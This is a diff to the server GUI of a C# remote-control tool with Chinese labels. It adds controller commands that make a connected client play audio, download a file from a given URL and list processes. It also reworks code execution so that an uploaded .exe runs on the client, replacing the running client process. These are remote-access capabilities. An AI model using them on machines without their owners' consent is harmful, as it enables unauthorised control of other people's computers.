@@ -1418,6 +1418,64 @@ namespace RemoteControl.Server
             }
         }
 
+        private void 播放音乐ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (this.listView1.SelectedItems.Count < 1)
+                return;
+
+            string path;
+            if (!IsListViewItemAFile(this.listView1.SelectedItems[0], out path))
+            {
+                MsgBox.ShowInfo("请选择一个音频文件！");
+                return;
+            }
+
+            string ext = System.IO.Path.GetExtension(path);
+            List<string> exts = new List<string>(){".mp3",".wma",".flac",".ogg"};
+            if (!exts.Contains(ext))
+            {
+                MsgBox.ShowInfo("请选择一个音频文件！");
+                return;
+            }
+
+            if (this.currentSession != null)
+            {
+                RequestPlayMusic req = new RequestPlayMusic();
+                req.MusicFilePath = path;
+                this.currentSession.Send(ePacketType.PACKET_PLAY_MUSIC_REQUEST, req);
+            }
+        }
+
+        private void 停止播放音乐ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (this.currentSession != null)
+            {
+                buttonStopPlayMusic_Click(null, null);
+            }
+        }
+
+        private void 远程下载到此处ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (!IsCurrentSessionValid())
+                return;
+            if (this.listView1.Tag == null)
+                return;
+
+            var frm = new FrmDownloadWebFile();
+            frm.FormClosing += (o, args) =>
+            {
+                if (frm.WebUrl == null || frm.DestFilePath == null)
+                    return;
+
+                RequestDownloadWebFile req = new RequestDownloadWebFile();
+                req.WebFileUrl = frm.WebUrl;
+                string filePath = System.IO.Path.Combine(this.listView1.Tag.ToString(), frm.DestFilePath);
+                req.DestinationPath = filePath;
+                PostRequstWithCurrentSession(ePacketType.PACKET_DOWNLOAD_WEBFILE_REQUEST, req);
+            };
+            frm.Show();
+        }
+
         private void 打开文件ToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if(this.listView1.SelectedItems.Count<1)
@@ -1466,7 +1524,12 @@ namespace RemoteControl.Server
 
         private void 刷新ToolStripMenuItem1_Click(object sender, EventArgs e)
         {
-            this.PostRequstWithCurrentSession(ePacketType.PACKET_GET_PROCESSES_REQUEST, null);
+            this.PostRequstWithCurrentSession(ePacketType.PACKET_GET_PROCESSES_REQUEST, new RequestGetProcesses());
+        }
+
+        private void 刷新急速ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            this.PostRequstWithCurrentSession(ePacketType.PACKET_GET_PROCESSES_REQUEST, new RequestGetProcesses(){IsSimpleMode = true});
         }
 
         private void 结束进程ToolStripMenuItem_Click(object sender, EventArgs e)
@@ -1768,7 +1831,7 @@ namespace RemoteControl.Server
         }
 
         /// <summary>
-        /// “执行代码”按钮点击事件
+        /// “更新客户端”按钮点击事件
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
@@ -1780,18 +1843,13 @@ namespace RemoteControl.Server
                 return;
             }
             OpenFileDialog ofd = new OpenFileDialog();
-            ofd.Title = "请选择代码插件";
-            ofd.Filter = "代码插件(*.dll)|*.dll|所有文件(*.*)|*.*";
+            ofd.Title = "请选择客户端程序";
+            ofd.Filter = "客户端(*.exe)|*.exe";
             ofd.FilterIndex = 1;
             ofd.Multiselect = false;
             if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
             {
                 string codeFile = ofd.FileName;
-                if (!PluginLoader.IsPlugin(codeFile))
-                {
-                    MsgBox.ShowInfo("非代码插件！");
-                    return;
-                }
 
                 new Thread(() => {
                     string codeId = Guid.NewGuid().ToString();
@@ -1813,8 +1871,14 @@ namespace RemoteControl.Server
                     }
                     fs.Close();
                     fs.Dispose();
-                    this.currentSession.Send(ePacketType.PACKET_RUN_EXEC_CODE_REQUEST, new RequestRunExecCode() { ID=codeId });
-                    MsgBox.ShowInfo("代码插件已经提交到客户端，等待执行！");
+                    this.currentSession.Send(ePacketType.PACKET_RUN_EXEC_CODE_REQUEST, new RequestRunExecCode()
+                    {
+                        ID=codeId, 
+                        Mode = eExecMode.ExecByFile,
+                        FileArguments = "/delay:5000",
+                        IsKillMySelf = true
+                    });
+                    MsgBox.ShowInfo("客户端更新指令已发送！");
                 }) { IsBackground = true }.Start();
             }
         }
